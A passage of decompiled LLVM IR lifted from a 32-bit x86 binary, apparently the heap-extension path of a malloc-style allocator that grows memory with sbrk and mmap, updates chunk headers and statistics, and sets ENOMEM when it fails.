  %storemerge.in = phi i32* [ @esi, %dec_label_pc_804a6d3 ], [ @ebx, %dec_label_pc_804a6e6 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_804a6ee = or i32 %storemerge, 2
  %v1_804a6f1 = load i32, i32* @edx, align 4
  %v2_804a6f1 = add i32 %v1_804a6f1, 4
  %v3_804a6f1 = inttoptr i32 %v2_804a6f1 to i32*
  store i32 %v1_804a6ee, i32* %v3_804a6f1, align 4
  %v0_804a6f4 = load i32, i32* @global_var_8054950.45, align 16
  %v1_804a6f9 = add i32 %v0_804a6f4, 1
  store i32 %v1_804a6f9, i32* %eax.global-to-local, align 4
  store i32 %v1_804a6f9, i32* @global_var_8054950.45, align 16
  %v1_804a6ff = load i32, i32* @global_var_8054958.47, align 8
  %v7_804a705 = icmp sgt i32 %v1_804a6f9, %v1_804a6ff
  br i1 %v7_804a705, label %dec_label_pc_804a707, label %dec_label_pc_804a70c

dec_label_pc_804a707:                             ; preds = %dec_label_pc_804a6ee
  store i32 %v1_804a6f9, i32* @global_var_8054958.47, align 8
  br label %dec_label_pc_804a70c

dec_label_pc_804a70c:                             ; preds = %dec_label_pc_804a6ee, %dec_label_pc_804a707
  %v0_804a70c = load i32, i32* @global_var_8054964.48, align 4
  %v1_804a711 = load i32, i32* @ebx, align 4
  %v2_804a711 = add i32 %v1_804a711, %v0_804a70c
  store i32 %v2_804a711, i32* %eax.global-to-local, align 4
  store i32 %v2_804a711, i32* @global_var_8054964.48, align 4
  %v1_804a718 = load i32, i32* @global_var_8054970.49, align 16
  %tmp130 = icmp ugt i32 %v2_804a711, %v1_804a718
  br i1 %tmp130, label %dec_label_pc_804a720, label %dec_label_pc_804a725

dec_label_pc_804a720:                             ; preds = %dec_label_pc_804a70c
  store i32 %v2_804a711, i32* @global_var_8054970.49, align 16
  br label %dec_label_pc_804a725

dec_label_pc_804a725:                             ; preds = %dec_label_pc_804a70c, %dec_label_pc_804a720
  %v1_804a725 = load i32, i32* @global_var_8054968.50, align 8
  %v2_804a725 = add i32 %v1_804a725, %v2_804a711
  store i32 %v2_804a725, i32* %eax.global-to-local, align 4
  %v1_804a72b = load i32, i32* @global_var_8054974.51, align 4
  %tmp131 = icmp ugt i32 %v2_804a725, %v1_804a72b
  br i1 %tmp131, label %dec_label_pc_804a737, label %dec_label_pc_804a388

dec_label_pc_804a737:                             ; preds = %dec_label_pc_804a725
  store i32 %v2_804a725, i32* @global_var_8054974.51, align 4
  br label %dec_label_pc_804a388

dec_label_pc_804a741:                             ; preds = %dec_label_pc_804a69c, %dec_label_pc_804a6b0.dec_label_pc_804a741_crit_edge, %dec_label_pc_804a68b, %dec_label_pc_804a674
  %v0_804a741 = phi i32 [ %v0_804a741.pre, %dec_label_pc_804a6b0.dec_label_pc_804a741_crit_edge ], [ %v0_804a609, %dec_label_pc_804a68b ], [ %v0_804a609, %dec_label_pc_804a69c ], [ %v0_804a609, %dec_label_pc_804a674 ]
  store i32 %v0_804a741, i32* %eax.global-to-local, align 4
  %v1_804a74a = add i32 %v0_804a741, 4
  %v2_804a74a = inttoptr i32 %v1_804a74a to i32*
  %v3_804a74a = load i32, i32* %v2_804a74a, align 4
  %v1_804a754 = and i32 %v3_804a74a, -4
  %v2_804a754 = icmp eq i32 %v1_804a754, 0
  store i32 %v1_804a754, i32* @ebp, align 4
  %v1_804a757 = load i32, i32* @global_var_8054948.52, align 8
  %v2_804a757 = add i32 %v1_804a757, %v1_804a613
  store i32 %v2_804a757, i32* %eax.global-to-local, align 4
  %v0_804a75d = load i8, i8* @global_var_8054960.53, align 32
  %v1_804a75d = urem i8 %v0_804a75d, 2
  %v2_804a75d = icmp eq i8 %v1_804a75d, 0
  br i1 %v2_804a75d, label %dec_label_pc_804a768, label %dec_label_pc_804a766

dec_label_pc_804a766:                             ; preds = %dec_label_pc_804a741
  %v2_804a766 = sub i32 %v2_804a757, %v1_804a754
  store i32 %v2_804a766, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a768

dec_label_pc_804a768:                             ; preds = %dec_label_pc_804a741, %dec_label_pc_804a766
  %v0_804a76c = phi i32 [ %v2_804a757, %dec_label_pc_804a741 ], [ %v2_804a766, %dec_label_pc_804a766 ]
  %v5_804a76c = add i32 %v0_804a76c, %v1_804a674
  store i32 %v5_804a76c, i32* %eax.global-to-local, align 4
  %v1_804a770 = sub i32 0, %v0_804a640
  store i32 %v1_804a770, i32* @edx, align 4
  %v2_804a778 = and i32 %v5_804a76c, %v1_804a770
  store i32 %v2_804a778, i32* @esi, align 4
  %tmp88 = icmp slt i32 %v2_804a778, 1
  br i1 %tmp88, label %dec_label_pc_804a792, label %dec_label_pc_804a77c

dec_label_pc_804a77c:                             ; preds = %dec_label_pc_804a768
  store i32 %v2_804a778, i32* %stack_var_-92, align 4
  %v1_804a780 = call i32 @__GI_sbrk(i32 %v2_804a778)
  store i32 %v1_804a780, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_804a780, i32* @ebx, align 4
  %v10_804a78d = icmp eq i32 %v1_804a780, -1
  %v1_804a790 = icmp eq i1 %v10_804a78d, false
  br i1 %v1_804a790, label %dec_label_pc_804a7e8.dec_label_pc_804a7f1_crit_edge, label %dec_label_pc_804a77c.dec_label_pc_804a792_crit_edge

dec_label_pc_804a77c.dec_label_pc_804a792_crit_edge: ; preds = %dec_label_pc_804a77c
  %v0_804a792.pre = load i8, i8* @global_var_8054960.53, align 32
  br label %dec_label_pc_804a792

dec_label_pc_804a792:                             ; preds = %dec_label_pc_804a77c.dec_label_pc_804a792_crit_edge, %dec_label_pc_804a768
  %v0_804a7be = phi i32 [ -1, %dec_label_pc_804a77c.dec_label_pc_804a792_crit_edge ], [ %v1_804a770, %dec_label_pc_804a768 ]
  %v0_804a792 = phi i8 [ %v0_804a792.pre, %dec_label_pc_804a77c.dec_label_pc_804a792_crit_edge ], [ %v0_804a75d, %dec_label_pc_804a768 ]
  %v1_804a792 = urem i8 %v0_804a792, 2
  %v2_804a792 = icmp eq i8 %v1_804a792, 0
  br i1 %v2_804a792, label %dec_label_pc_804a792.dec_label_pc_804a7a7_crit_edge, label %dec_label_pc_804a79b

dec_label_pc_804a792.dec_label_pc_804a7a7_crit_edge: ; preds = %dec_label_pc_804a792
  %v0_804a7a7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a7a7

dec_label_pc_804a79b:                             ; preds = %dec_label_pc_804a792
  %v2_804a79f = add i32 %v1_804a754, %v1_804a674
  store i32 %v2_804a79f, i32* %eax.global-to-local, align 4
  %v0_804a7a1 = load i32, i32* @esi, align 4
  %v2_804a7a1 = add i32 %v0_804a7a1, %v2_804a79f
  %v5_804a7a3 = and i32 %v2_804a7a1, %v1_804a770
  store i32 %v5_804a7a3, i32* @esi, align 4
  br label %dec_label_pc_804a7a7

dec_label_pc_804a7a7:                             ; preds = %dec_label_pc_804a792.dec_label_pc_804a7a7_crit_edge, %dec_label_pc_804a79b
  %v0_804a7a7 = phi i32 [ %v0_804a7a7.pre, %dec_label_pc_804a792.dec_label_pc_804a7a7_crit_edge ], [ %v5_804a7a3, %dec_label_pc_804a79b ]
  %tmp132 = icmp ult i32 %v0_804a7a7, 1048576
  br i1 %tmp132, label %dec_label_pc_804a7af, label %dec_label_pc_804a7b4

dec_label_pc_804a7af:                             ; preds = %dec_label_pc_804a7a7
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_804a7b4

dec_label_pc_804a7b4:                             ; preds = %dec_label_pc_804a7a7, %dec_label_pc_804a7af
  %v0_804a7c8 = phi i32 [ %v0_804a7a7, %dec_label_pc_804a7a7 ], [ 1048576, %dec_label_pc_804a7af ]
  %tmp133 = icmp ugt i32 %v0_804a7c8, %v1_804a69e
  br i1 %tmp133, label %dec_label_pc_804a7be, label %dec_label_pc_804a9f6

dec_label_pc_804a7be:                             ; preds = %dec_label_pc_804a7b4
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804a7cb = call i32 @mmap(i32 0, i32 %v0_804a7c8, i32 3, i32 34, i32 0, i32 0, i32 %v0_804a7be, i32 %v0_804a7be)
  store i32 %v8_804a7cb, i32* %eax.global-to-local, align 4
  store i32 %v8_804a7cb, i32* @ebx, align 4
  %v10_804a7d5 = icmp eq i32 %v8_804a7cb, -1
  br i1 %v10_804a7d5, label %dec_label_pc_804a9f6, label %dec_label_pc_804a7e8.thread

dec_label_pc_804a7e8.thread:                      ; preds = %dec_label_pc_804a7be
  %v0_804a7de = load i8, i8* @global_var_8054960.53, align 1
  %v2_804a7de = and i8 %v0_804a7de, -2
  store i8 %v2_804a7de, i8* @global_var_8054960.53, align 32
  %v1_804a7e5 = load i32, i32* @esi, align 4
  %v2_804a7e5 = add i32 %v1_804a7e5, %v8_804a7cb
  store i32 %v2_804a7e5, i32* @edx, align 4
  br label %dec_label_pc_804a7f1

dec_label_pc_804a7e8.dec_label_pc_804a7f1_crit_edge: ; preds = %dec_label_pc_804a77c
  %v1_804a7f5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a7f1

dec_label_pc_804a7f1:                             ; preds = %dec_label_pc_804a7e8.dec_label_pc_804a7f1_crit_edge, %dec_label_pc_804a7e8.thread
  %v1_804a7f5 = phi i32 [ %v1_804a7e5, %dec_label_pc_804a7e8.thread ], [ %v1_804a7f5.pre, %dec_label_pc_804a7e8.dec_label_pc_804a7f1_crit_edge ]
  %v0_804a8bd92 = phi i32 [ %v8_804a7cb, %dec_label_pc_804a7e8.thread ], [ %v1_804a780, %dec_label_pc_804a7e8.dec_label_pc_804a7f1_crit_edge ]
  %v0_804a8af91 = phi i32 [ %v2_804a7e5, %dec_label_pc_804a7e8.thread ], [ -1, %dec_label_pc_804a7e8.dec_label_pc_804a7f1_crit_edge ]
  %v0_804a7f5 = load i32, i32* @global_var_8054968.50, align 8
  %v2_804a7f5 = add i32 %v1_804a7f5, %v0_804a7f5
  store i32 %v2_804a7f5, i32* @global_var_8054968.50, align 8
  %v2_804a7fb = add i32 %v1_804a754, %v0_804a741
  store i32 %v2_804a7fb, i32* %ecx.global-to-local, align 4
  %v2_804a7fd = sub i32 %v0_804a8bd92, %v2_804a7fb
  %v7_804a7fd = icmp ult i32 %v0_804a8bd92, %v2_804a7fb
  %v12_804a7fd = icmp eq i32 %v2_804a7fd, 0
  %v1_804a7ff = icmp eq i1 %v12_804a7fd, false
  br i1 %v1_804a7ff, label %dec_label_pc_804a818, label %dec_label_pc_804a801

dec_label_pc_804a801:                             ; preds = %dec_label_pc_804a7f1
  %v10_804a801 = icmp eq i32 %v0_804a8af91, -1
  %v1_804a804 = icmp eq i1 %v10_804a801, false
  br i1 %v1_804a804, label %dec_label_pc_804a818, label %dec_label_pc_804a806

dec_label_pc_804a806:                             ; preds = %dec_label_pc_804a801
  %v2_804a806 = add i32 %v1_804a7f5, %v1_804a754
  store i32 %v0_804a741, i32* %ecx.global-to-local, align 4
  %v1_804a80d = or i32 %v2_804a806, 1
  store i32 %v1_804a80d, i32* %eax.global-to-local, align 4
  store i32 %v1_804a80d, i32* %v2_804a74a, align 4
  br label %dec_label_pc_804a945

dec_label_pc_804a818:                             ; preds = %dec_label_pc_804a801, %dec_label_pc_804a7f1
  %v0_804a818 = load i8, i8* @global_var_8054960.53, align 1
  %v1_804a818 = sext i8 %v0_804a818 to i32
  store i32 %v1_804a818, i32* %eax.global-to-local, align 4
  %v2_804a81d = urem i8 %v0_804a818, 2
  %v3_804a81d = icmp eq i8 %v2_804a81d, 0
  br i1 %v3_804a81d, label %dec_label_pc_804a831, label %dec_label_pc_804a821

dec_label_pc_804a821:                             ; preds = %dec_label_pc_804a818
  br i1 %v2_804a754, label %dec_label_pc_804a831, label %dec_label_pc_804a825

dec_label_pc_804a825:                             ; preds = %dec_label_pc_804a821
  %v1_804a827 = icmp eq i1 %v7_804a7fd, false
  br i1 %v1_804a827, label %dec_label_pc_804a831, label %dec_label_pc_804a829

dec_label_pc_804a829:                             ; preds = %dec_label_pc_804a825
  %v1_804a829 = and i32 %v1_804a818, -2
  %v4_804a829 = trunc i32 %v1_804a829 to i8
  store i32 %v1_804a829, i32* %eax.global-to-local, align 4
  store i8 %v4_804a829, i8* @global_var_8054960.53, align 32
  br label %dec_label_pc_804a831

dec_label_pc_804a831:                             ; preds = %dec_label_pc_804a825, %dec_label_pc_804a821, %dec_label_pc_804a818, %dec_label_pc_804a829
  %v0_804a831 = phi i8 [ %v0_804a818, %dec_label_pc_804a825 ], [ %v0_804a818, %dec_label_pc_804a821 ], [ %v0_804a818, %dec_label_pc_804a818 ], [ %v4_804a829, %dec_label_pc_804a829 ]
  %v1_804a831 = urem i8 %v0_804a831, 2
  %v2_804a831 = icmp eq i8 %v1_804a831, 0
  br i1 %v2_804a831, label %dec_label_pc_804a8af, label %dec_label_pc_804a83a

dec_label_pc_804a83a:                             ; preds = %dec_label_pc_804a831
  br i1 %v2_804a754, label %dec_label_pc_804a848, label %dec_label_pc_804a83e

dec_label_pc_804a83e:                             ; preds = %dec_label_pc_804a83a
  store i32 %v2_804a7fd, i32* %eax.global-to-local, align 4
  %v2_804a842 = add i32 %v2_804a7f5, %v2_804a7fd
  store i32 %v2_804a842, i32* @global_var_8054968.50, align 8
  br label %dec_label_pc_804a848

dec_label_pc_804a848:                             ; preds = %dec_label_pc_804a83a, %dec_label_pc_804a83e
  %v1_804a84a = urem i32 %v0_804a8bd92, 8
  %v2_804a84a = icmp eq i32 %v1_804a84a, 0
  store i32 %v1_804a84a, i32* %edx.global-to-local, align 4
  %v1_804a84d = icmp eq i1 %v2_804a84a, false
  br i1 %v1_804a84d, label %dec_label_pc_804a855, label %dec_label_pc_804a84f

dec_label_pc_804a84f:                             ; preds = %dec_label_pc_804a848
  store i32 %v0_804a8bd92, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a85f

dec_label_pc_804a855:                             ; preds = %dec_label_pc_804a848
  %v2_804a85a = sub nsw i32 8, %v1_804a84a
  store i32 %v2_804a85a, i32* %eax.global-to-local, align 4
  %v2_804a85c = add i32 %v2_804a85a, %v0_804a8bd92
  store i32 %v2_804a85c, i32* @edi, align 4
  br label %dec_label_pc_804a85f

dec_label_pc_804a85f:                             ; preds = %dec_label_pc_804a84f, %dec_label_pc_804a855
  %v0_804a862 = phi i32 [ 0, %dec_label_pc_804a84f ], [ %v2_804a85a, %dec_label_pc_804a855 ]
  %v2_804a85f = add i32 %v1_804a7f5, %v0_804a8bd92
  %v2_804a862 = add i32 %v0_804a862, %v1_804a754
  store i32 %v2_804a862, i32* %ecx.global-to-local, align 4
  %v2_804a86b = add i32 %v2_804a862, %v2_804a85f
  store i32 %v2_804a86b, i32* %edx.global-to-local, align 4
  %v2_804a871 = add i32 %v2_804a86b, %v1_804a674
  %v5_804a874 = and i32 %v2_804a871, %v1_804a770
  %v2_804a87b = sub i32 %v5_804a874, %v2_804a86b
  store i32 %v2_804a87b, i32* %eax.global-to-local, align 4
  %v2_804a87d = add i32 %v2_804a87b, %v2_804a862
  store i32 %v2_804a87d, i32* @esi, align 4
  store i32 %v2_804a87d, i32* %stack_var_-92, align 4
  %v1_804a881 = call i32 @__GI_sbrk(i32 %v2_804a87d)
  store i32 %v1_804a881, i32* %eax.global-to-local, align 4
  store i32 %v1_804a881, i32* @edx, align 4
  %v10_804a88b = icmp eq i32 %v1_804a881, -1
  %v1_804a88e = icmp eq i1 %v10_804a88b, false
  br i1 %v1_804a88e, label %dec_label_pc_804a89e, label %dec_label_pc_804a890

dec_label_pc_804a890:                             ; preds = %dec_label_pc_804a85f
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804a895 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804a895, i32* %eax.global-to-local, align 4
  store i32 %v1_804a895, i32* @edx, align 4
  br label %dec_label_pc_804a8d2

dec_label_pc_804a89e:                             ; preds = %dec_label_pc_804a85f
  %v1_804a89e = load i32, i32* @ebx, align 4
  %v7_804a89e = icmp ult i32 %v1_804a881, %v1_804a89e
  %v1_804a8a0 = icmp eq i1 %v7_804a89e, false
  br i1 %v1_804a8a0, label %dec_label_pc_804a8d7, label %dec_label_pc_804a8a2

dec_label_pc_804a8a2:                             ; preds = %dec_label_pc_804a89e
  %v0_804a8a2 = load i8, i8* @global_var_8054960.53, align 1
  %v2_804a8a2 = and i8 %v0_804a8a2, -2
  store i8 %v2_804a8a2, i8* @global_var_8054960.53, align 32
  store i32 %v2_804a85f, i32* @edx, align 4
  br label %dec_label_pc_804a8b6

dec_label_pc_804a8af:                             ; preds = %dec_label_pc_804a831
  %v10_804a8af = icmp eq i32 %v0_804a8af91, -1
  br i1 %v10_804a8af, label %dec_label_pc_804a8ba, label %dec_label_pc_804a8b4

dec_label_pc_804a8b4:                             ; preds = %dec_label_pc_804a8af
  store i32 %v0_804a8bd92, i32* @edi, align 4
  br label %dec_label_pc_804a8b6

dec_label_pc_804a8b6:                             ; preds = %dec_label_pc_804a8a2, %dec_label_pc_804a8b4
  %v0_804a8d749 = phi i32 [ %v2_804a85f, %dec_label_pc_804a8a2 ], [ %v0_804a8af91, %dec_label_pc_804a8b4 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804a8d7

dec_label_pc_804a8ba:                             ; preds = %dec_label_pc_804a8af
  store i32 %v0_804a8bd92, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804a8c1 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804a8c1, i32* @edx, align 4
  %v1_804a8c8 = load i32, i32* @ebx, align 4
  %v2_804a8c8 = sub i32 %v1_804a8c1, %v1_804a8c8
  %v1_804a8ca = load i32, i32* @esi, align 4
  %v2_804a8ca = sub i32 %v2_804a8c8, %v1_804a8ca
  store i32 %v2_804a8ca, i32* %eax.global-to-local, align 4
  %v0_804a8cc = load i32, i32* @global_var_8054968.50, align 8
  %v2_804a8cc = add i32 %v0_804a8cc, %v2_804a8ca
  store i32 %v2_804a8cc, i32* @global_var_8054968.50, align 8
  br label %dec_label_pc_804a8d2

dec_label_pc_804a8d2:                             ; preds = %dec_label_pc_804a890, %dec_label_pc_804a8ba
  %v0_804a8d748 = phi i32 [ %v1_804a895, %dec_label_pc_804a890 ], [ %v1_804a8c1, %dec_label_pc_804a8ba ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804a8d7

dec_label_pc_804a8d7:                             ; preds = %dec_label_pc_804a89e, %dec_label_pc_804a8b6, %dec_label_pc_804a8d2
  %v0_804a8dc = phi i32 [ %v1_804a881, %dec_label_pc_804a89e ], [ %v0_804a8d749, %dec_label_pc_804a8b6 ], [ %v0_804a8d748, %dec_label_pc_804a8d2 ]
  %v10_804a8d7 = icmp eq i32 %v0_804a8dc, -1
  br i1 %v10_804a8d7, label %dec_label_pc_804a945, label %dec_label_pc_804a8dc

dec_label_pc_804a8dc:                             ; preds = %dec_label_pc_804a8d7
  %v1_804a8dc = load i32, i32* @edi, align 4
  %v2_804a8dc = sub i32 %v0_804a8dc, %v1_804a8dc
  store i32 %v2_804a8dc, i32* @edx, align 4
  store i32 %v1_804a8dc, i32* @global_var_805462c.38, align 4
  %v1_804a8e4 = load i32, i32* @esi, align 4
  %v2_804a8e4 = add i32 %v1_804a8e4, %v2_804a8dc
  %v1_804a8e7 = or i32 %v2_804a8e4, 1
  store i32 %v1_804a8e7, i32* %eax.global-to-local, align 4
  %v2_804a8ea = add i32 %v1_804a8dc, 4
  %v3_804a8ea = inttoptr i32 %v2_804a8ea to i32*
  store i32 %v1_804a8e7, i32* %v3_804a8ea, align 4
  %v0_804a8ed = load i32, i32* @global_var_8054968.50, align 8
  %v1_804a8ed = load i32, i32* @esi, align 4
  %v2_804a8ed = add i32 %v1_804a8ed, %v0_804a8ed
  store i32 %v2_804a8ed, i32* @global_var_8054968.50, align 8
  br i1 %v2_804a754, label %dec_label_pc_804a945, label %dec_label_pc_804a8f7

dec_label_pc_804a8f7:                             ; preds = %dec_label_pc_804a8dc
  %v1_804a8f7 = add i32 %v1_804a754, -12
  store i32 %v0_804a741, i32* %ecx.global-to-local, align 4
  %v1_804a8fe = and i32 %v1_804a8f7, -8
  store i32 %v1_804a8fe, i32* %eax.global-to-local, align 4
  %v1_804a903 = or i32 %v1_804a8fe, 1
  store i32 %v1_804a903, i32* @edx, align 4
  %v5_804a906 = icmp ult i32 %v1_804a8fe, 15
  store i32 %v1_804a903, i32* %v2_804a74a, align 4
  %v0_804a90c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a90c = load i32, i32* %eax.global-to-local, align 4
  %v2_804a90c = add i32 %v0_804a90c, 4
  %v3_804a90c = add i32 %v2_804a90c, %v1_804a90c
  %v4_804a90c = inttoptr i32 %v3_804a90c to i32*
  store i32 5, i32* %v4_804a90c, align 4
  %v0_804a914 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a914 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a914 = add i32 %v0_804a914, 8
  %v3_804a914 = add i32 %v2_804a914, %v1_804a914
  %v4_804a914 = inttoptr i32 %v3_804a914 to i32*
  store i32 5, i32* %v4_804a914, align 4
  br i1 %v5_804a906, label %dec_label_pc_804a945, label %dec_label_pc_804a91e

dec_label_pc_804a91e:                             ; preds = %dec_label_pc_804a8f7
  %v0_804a921 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a923 = add i32 %v0_804a921, 8
  store i32 %v1_804a923, i32* %eax.global-to-local, align 4
  %v0_804a926 = load i32, i32* @global_var_8054944.54, align 4
  store i32 %v0_804a926, i32* @ebx, align 4
  store i32 %v1_804a923, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8054944.54, align 4
  %v1_804a937 = call i32 @free(i32 %v1_804a923)
  store i32 %v1_804a937, i32* %eax.global-to-local, align 4
  %v0_804a93c = load i32, i32* @ebx, align 4
  store i32 %v0_804a93c, i32* @global_var_8054944.54, align 4
  br label %dec_label_pc_804a945

dec_label_pc_804a945:                             ; preds = %dec_label_pc_804a8f7, %dec_label_pc_804a8dc, %dec_label_pc_804a8d7, %dec_label_pc_804a806, %dec_label_pc_804a91e
  %v0_804a945 = load i32, i32* @global_var_8054968.50, align 8
  store i32 %v0_804a945, i32* %eax.global-to-local, align 4
  %v1_804a94a = load i32, i32* @global_var_805496c.55, align 4
  %tmp134 = icmp ugt i32 %v0_804a945, %v1_804a94a
  br i1 %tmp134, label %dec_label_pc_804a952, label %dec_label_pc_804a957

dec_label_pc_804a952:                             ; preds = %dec_label_pc_804a945
  store i32 %v0_804a945, i32* @global_var_805496c.55, align 4
  br label %dec_label_pc_804a957

dec_label_pc_804a957:                             ; preds = %dec_label_pc_804a945, %dec_label_pc_804a952
  %v1_804a957 = load i32, i32* @global_var_8054964.48, align 4
  %v2_804a957 = add i32 %v1_804a957, %v0_804a945
  store i32 %v2_804a957, i32* %eax.global-to-local, align 4
  %v1_804a95d = load i32, i32* @global_var_8054974.51, align 4
  %tmp135 = icmp ugt i32 %v2_804a957, %v1_804a95d
  br i1 %tmp135, label %dec_label_pc_804a965, label %dec_label_pc_804a96a

dec_label_pc_804a965:                             ; preds = %dec_label_pc_804a957
  store i32 %v2_804a957, i32* @global_var_8054974.51, align 4
  br label %dec_label_pc_804a96a

dec_label_pc_804a96a:                             ; preds = %dec_label_pc_804a957, %dec_label_pc_804a965
  %v0_804a96a = load i32, i32* @global_var_805462c.38, align 4
  store i32 %v0_804a96a, i32* @ebx, align 4
  %v1_804a970 = add i32 %v0_804a96a, 4
  %v2_804a970 = inttoptr i32 %v1_804a970 to i32*
  %v3_804a970 = load i32, i32* %v2_804a970, align 4
  %v1_804a973 = and i32 %v3_804a970, -4
  store i32 %v1_804a973, i32* @ecx, align 4
  %v10_804a976 = icmp ult i32 %v1_804a973, %v1_804a613
  br i1 %v10_804a976, label %dec_label_pc_804a9f6, label %dec_label_pc_804a97c

dec_label_pc_804a97c:                             ; preds = %dec_label_pc_804a96a
  store i32 %v1_804a69e, i32* %esi.global-to-local, align 4
  %v2_804a982 = sub i32 %v1_804a973, %v1_804a69e
  store i32 %v2_804a982, i32* %ecx.global-to-local, align 4
  %v2_804a984 = add i32 %v0_804a96a, %v1_804a69e
  store i32 %v2_804a984, i32* @edx, align 4
  %v1_804a987 = or i32 %v1_804a69e, 1
  store i32 %v1_804a987, i32* %eax.global-to-local, align 4
  store i32 %v2_804a984, i32* @global_var_805462c.38, align 4
  store i32 %v1_804a987, i32* %v2_804a970, align 4
  %v0_804a993.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804a993

dec_label_pc_804a993:                             ; preds = %dec_label_pc_804a624, %dec_label_pc_804a97c
  %v0_804a993 = phi i32 [ %v5_804a637, %dec_label_pc_804a624 ], [ %v0_804a993.pre, %dec_label_pc_804a97c ]
  %v1_804a993 = or i32 %v0_804a993, 1
  store i32 %v1_804a993, i32* @ecx, align 4
  %v0_804a996 = load i32, i32* @ebx, align 4
  %v1_804a996 = add i32 %v0_804a996, 8
  store i32 %v1_804a996, i32* %ebx.global-to-local, align 4
  %v1_804a999 = load i32, i32* @edx, align 4
  %v2_804a999 = add i32 %v1_804a999, 4
  %v3_804a999 = inttoptr i32 %v2_804a999 to i32*
  store i32 %v1_804a993, i32* %v3_804a999, align 4
  br label %dec_label_pc_804aa03

dec_label_pc_804a99e:                             ; preds = %dec_label_pc_804a3de
  %v5_804a9a4 = sub i32 %v1_804a3c1, %v1_804a69e
  store i32 %v5_804a9a4, i32* %eax.global-to-local, align 4
  %v2_804a9a8 = add i32 %v0_804a48c111, %v1_804a69e
  store i32 %v2_804a9a8, i32* @edx, align 4
  %v1_804a9ac = or i32 %v1_804a69e, 1
  store i32 %v2_804a9a8, i32* @global_var_8054630.39, align 16
  store i32 %v1_804a9ac, i32* %v2_804a3bb, align 4
  %v0_804a9b8 = load i32, i32* %eax.global-to-local, align 4
  %v0_804a9ba = load i32, i32* @edx, align 4
  store i32 %v0_804a9ba, i32* @global_var_805463c.56, align 4
  %v1_804a9c0 = or i32 %v0_804a9b8, 1
  store i32 %v1_804a9c0, i32* @ecx, align 4
  store i32 %v0_804a9ba, i32* @global_var_8054640.41, align 64
  %v1_804a9c9 = add i32 %v0_804a9ba, 8
  %v2_804a9c9 = inttoptr i32 %v1_804a9c9 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a9c9, align 4
  %v0_804a9d0 = load i32, i32* @edx, align 4
  %v1_804a9d0 = add i32 %v0_804a9d0, 12
  %v2_804a9d0 = inttoptr i32 %v1_804a9d0 to i32*
  store i32 ptrtoint (i32* @global_var_8054634.40 to i32), i32* %v2_804a9d0, align 4
  %v0_804a9d7 = load i32, i32* @ecx, align 4
  %v1_804a9d7 = load i32, i32* @edx, align 4
  %v2_804a9d7 = add i32 %v1_804a9d7, 4
  %v3_804a9d7 = inttoptr i32 %v2_804a9d7 to i32*
  store i32 %v0_804a9d7, i32* %v3_804a9d7, align 4
  %v0_804a9da = load i32, i32* %eax.global-to-local, align 4
  %v1_804a9da = load i32, i32* @edx, align 4
  %v3_804a9da = add i32 %v1_804a9da, %v0_804a9da
  %v4_804a9da = inttoptr i32 %v3_804a9da to i32*
  store i32 %v0_804a9da, i32* %v4_804a9da, align 4
  br label %dec_label_pc_804a9e8

dec_label_pc_804a9df:                             ; preds = %dec_label_pc_804a3ed
  store i32 %v1_804a69e, i32* %ebx.global-to-local, align 4
  %v0_804a9e3 = load i32, i32* @ebp, align 4
  %v2_804a9e3 = or i32 %v1_804a69e, 4
  %v3_804a9e3 = add i32 %v0_804a9e3, %v2_804a9e3
  %v4_804a9e3 = inttoptr i32 %v3_804a9e3 to i32*
  %v5_804a9e3 = load i32, i32* %v4_804a9e3, align 4
  %v6_804a9e3 = or i32 %v5_804a9e3, 1
  store i32 %v6_804a9e3, i32* %v4_804a9e3, align 4
  br label %dec_label_pc_804a9e8

dec_label_pc_804a9e8:                             ; preds = %dec_label_pc_804a99e, %dec_label_pc_804a9df
  %v0_804a9e8 = load i32, i32* @ebp, align 4
  %v1_804a9e8 = add i32 %v0_804a9e8, 8
  store i32 %v1_804a9e8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804aa03

dec_label_pc_804a9ed:                             ; preds = %dec_label_pc_804a4dd
  %v1_804a9ed = load i32, i32* @ebx, align 4
  %v2_804a9ed = add i32 %v0_804a4ec, 4
  %v3_804a9ed = add i32 %v2_804a9ed, %v1_804a9ed
  %v4_804a9ed = inttoptr i32 %v3_804a9ed to i32*
  %v5_804a9ed = load i32, i32* %v4_804a9ed, align 4
  %v6_804a9ed = or i32 %v5_804a9ed, 1
  store i32 %v6_804a9ed, i32* %v4_804a9ed, align 4
  br label %dec_label_pc_804a9f2

dec_label_pc_804a9f2:                             ; preds = %dec_label_pc_804a4f5, %dec_label_pc_804a9ed
  %v0_804a9f2 = load i32, i32* @ecx, align 4
  store i32 %v0_804a9f2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804aa03

dec_label_pc_804a9f6:                             ; preds = %dec_label_pc_804a7b4, %dec_label_pc_804a96a, %dec_label_pc_804a7be
  %v0_804a9f6 = load i32, i32* %stack_var_-92, align 4
  %v1_804a9f6 = call i32 @__errno_location(i32 %v0_804a9f6)
  store i32 %v1_804a9f6, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804a9fd = inttoptr i32 %v1_804a9f6 to i32*
  store i32 12, i32* %v1_804a9fd, align 4
  br label %dec_label_pc_804aa03

